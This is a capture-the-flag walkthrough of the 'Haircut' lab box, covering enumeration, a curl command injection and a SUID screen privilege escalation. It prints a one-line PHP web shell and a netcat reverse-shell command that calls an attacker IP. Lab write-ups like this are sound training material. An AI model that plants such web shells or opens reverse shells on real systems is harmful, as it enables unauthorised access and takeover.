# HAIRCUT
### Info:
OS: Linux x64<br>
IP: 10.10.10.24<br>
Difficulty :  Medium<br>
### Enumeration:
```nmap -sC -sV -oA nmap 10.10.10.24``` <br>

gives us the results : <br>
![alt text](https://i.imgur.com/5nBK8qx.png) <br>
Running dirbuster:
![alt text](https://i.imgur.com/cCMH7yJ.png)
### Exploitation:
Vulnerability Exploited: CURL/Command injection<br>
Whatever input we were providing was running as a curl command. Therefore intercepting and manipulating with burp as :
![alt text](https://i.imgur.com/NiXKcad.png) <br>
 <b>Shell.php </b>
```
root@kali:~/Desktop/boxes/Haircut# cat shell.php
<?php echo system($_REQUEST['kartik']); ?>
```
![alt text](https://i.imgur.com/clUD0Qb.png)
`kartik=nc -e /bin/bash 10.10.16.16 1234` and listening on port 1234 spawns the shell for us.
### Privilege Escaltion:
Privilege Escalation Vulnerability: SUID bit file<br>
<b>/usr/bin/screen-4.5.0 </b>
![alt text](https://i.imgur.com/KVWuqDF.png) <br>
and the exploit <br>
![alt text](https://i.imgur.com/kGqr6Ep.png) <br>
Running this manually (41154.sh) gets us the root.
### KNOWLEDGE GAIN:
HTTP-based fuzzing <br>
Exploiting CURL/Command injection <br>
Local Privesc via file Screen4.5 containing SUID bit.
